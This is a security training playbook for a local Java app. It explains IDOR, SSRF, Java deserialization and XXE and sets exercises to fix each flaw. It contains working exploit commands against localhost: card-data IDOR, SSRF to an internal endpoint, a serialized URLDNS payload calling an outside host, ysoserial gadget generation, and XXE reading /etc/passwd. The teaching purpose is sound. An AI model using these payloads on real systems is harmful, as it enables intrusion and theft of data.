# playbook-08.md & Api.java

Welcome to this 8th playbook, here you'll learn about Insecure Direct Object Reference, Server Side Request Forgery, Java unserialize issues, and XML External Entity.

## IDOR

Goal1: Fix the IDOR issue so a user can only acces their own billing information.
Goal2: Think about another solution to mitigate such issue and explain it without implementing it.

Insecure Direct Object Reference consist in a user, authentified or not, being able to access data that doesn't belong to them. It often requires guessing the right id or uuid to access, as well as a lack of ownership check, also call RBAC for Role Based Access Control.

```bash
# Test feature
curl -sSkg "http://127.0.0.1/api/user/1/billing/1" # Output: {"user_id":"1","card_info":"VISA, 4150321684570625, 8/2025, 425","card_id":"1","card_owner":"1"}
# Test exploit
curl -sSkg "http://127.0.0.1/api/user/1/billing/5" # Output: {"user_id":"1","card_info":"VISA, 4024007184111184, 10/2025, 718","card_id":"5","card_owner":"3"}
```

## SSRF

Goal1: Fix the SSRF that exposes the loopback and the internal network. Let's keep it simple for now, let's assume that we'll only pick profiles form https://fr.gravatar.com/ such as "https://fr.gravatar.com/ypdohmnjoxpatw40ul28"
Goal2: Without implementing it, propose a solution to protect access to /api/protected-feature without relying on the source IP.

Server Side Request Forgery are generally present when and attacker can control parts or all of a URLs or URIs (think about file:// glob:// jar:// etc) that is then used by the server to emit requests process some URI's content.

```bash
# Test feature
curl -sSkgi "http://127.0.0.1/api/protected-feature" # Output: {"content":"Denied, bad source IP"}
# Test exploit
curl -sSkgi "http://127.0.0.1/api/user/fetchProfile?url=http://127.0.0.1:8080/api/protected-feature" # Output: {"content":"{\"PATH\":\"/root/.sdkman/candidates/java/current/bin:/root/.sdkman/candidates/gradle/current/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",\"SDKMAN_VERSION\":\"5.15.0\",\"JAVA_HOME\":\"/root/.sdkman/candidates/java/current\",\"SDKMAN_CANDIDATES_API\":\"https://api.sdkman.io/2\",\"SDKMAN_PLATFORM\":\"linuxx64\",\"GRADLE_HOME\":\"/root/.sdkman/candidates/gradle/current\",\"HOSTNAME\":\"ab16d96fae0c\",\"SDKMAN_DIR\":\"/root/.sdkman\",\"PWD\":\"/sources\",\"HOME\":\"/root\",\"SHLVL\":\"0\",\"SDKMAN_CANDIDATES_DIR\":\"/root/.sdkman/candidates\",\"_\":\"/root/.sdkman/candidates/gradle/current/bin/gradle\"}"}
```

## Unserialize

Goal: Play a bit with the exploit, try to find a way to use (un)serialization without being at risk. How could we prevent unserialize issues?

Historically, (un)serialization was a convenient way to pass complex classes from one server to another, or to save a kind of "internal state" on the frontend before an end-user takes an action that will submit it again to the backend and update this state. The problem with this approach is that many Classes methods can be chained upon deserialization in a way to achieve remote code execution, code evaluation, or file read/write. The way such exploit works is _really_ complex, we'd be happy to chat more in depth about this, but not in this short session! ;)

A small quote from Snyk (dependency security analysis tool) we couldn't agree more with:

> The best way to prevent a Java deserialize vulnerability is to prevent Java serialization overall. If your application does not accept serialized objects at all, it cannot harm you.

```bash
# Test feature
# There's no real feature implemented here, we just want you to know that this exists, and can cause a lot of damage! :)

# Test exploit
PAYLOAD=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa%2FORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F3QAF3dvcmtzaG9wLnoubWFub2hhY2suY29tdAABL3EAfgAFdAAEaHR0cHB4dAAfaHR0cDovL3dvcmtzaG9wLnoubWFub2hhY2suY29tL3g%3D
curl -sSkgi "http://127.0.0.1/api/debug-feature?serializedObject=$PAYLOAD" # Output: {"content":"ok"}

# Bonus - Generate your own gadget!
## Setup SDKMan to have the right java version
curl -s "https://get.sdkman.io" | bash
sdk install java 11.0.14-zulu
sdk use java 11.0.14-zulu
# Get your dns bin here: https://requestbin.net/dns
alias urlencode='python3 -c "import sys; from urllib.parse import quote; print(quote(sys.argv[1], safe=str()))"'
PAYLOAD=$(urlencode $(java -jar ysoserial.jar URLDNS 'http://<YOUR_DNS_BIN>/' |  base64 -w 0))
echo "$PAYLOAD"
curl -sSkgi "http://127.0.0.1/api/debug-feature?serializedObject=$PAYLOAD"
# Verify it worked on your dns handler

# You can also list other gadgets with
java -jar ysoserial.jar -l
```

## XXE

Goal1: Fix the XML External Entity while preserving the current feature that parses xml and outputs
Hint: One line is more than enough for this!

XML External Entity is a super convenient issue for attackers as it allows the exploitation of many exploit primitives at once. Indeed, one XXE can lead to SSRF, file listing, reading, sometimes file upload, or even unserialize issues! The SSRF can work for any of http, https, ftp, sftp, jar, telnet, and much more! It has been known since early 2000, yet it's still quite common for various languages and frameworks to expose such issues with parsers not using the right options, or not adopting a "safe by default" approach...

```bash
# Test feature
curl -sSkg "http://127.0.0.1/api/xml" -H 'Content-Type: application/xml' --data-binary "$(cat sources/sample-good.xml)"  # Should display the content of xml back
# Test exploit
curl -sSkg "http://127.0.0.1/api/xml" -H 'Content-Type: application/xml' --data-binary "$(cat sources/sample-evil.xml)"  # Should display the content of /etc/passwd
```
